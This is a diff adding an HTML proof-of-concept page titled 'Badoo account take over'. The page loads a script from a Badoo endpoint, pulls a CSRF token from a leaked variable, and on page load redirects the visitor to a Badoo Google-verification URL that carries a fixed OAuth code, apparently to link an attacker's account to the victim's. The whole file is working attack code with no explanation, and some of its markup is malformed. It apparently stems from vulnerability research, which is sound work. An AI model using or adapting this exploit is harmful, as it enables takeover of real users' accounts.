@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>Badoo account take over</title>
+	<<script src="https://eu1.badoo.com/worker-scope/chrome-service-worker.js?ws=1"></script>
+</head>
+<body>
+	<<script>
+		function getCSRFcode(str) {
+			return str.split('=', [2])
+		}
+	window.onload = function(){
+		var csrf_code = getCSRFcode(url_stats)
+		csrf_url = 'https://eu1.badoo.com/google/verify.phtml?code=4/npsrfspM3yfn2SFUBearo8KQaXo6o9JkArgojuigZ6Pc&authuser=3&session_state=7cb85df679219ce71044666c7be3eo37ff54b56o..a81o&prompt=none&rt='+csrf_code;
+		window.location = csrf_url;
+	};
+	</script>
+</body>
+</html>
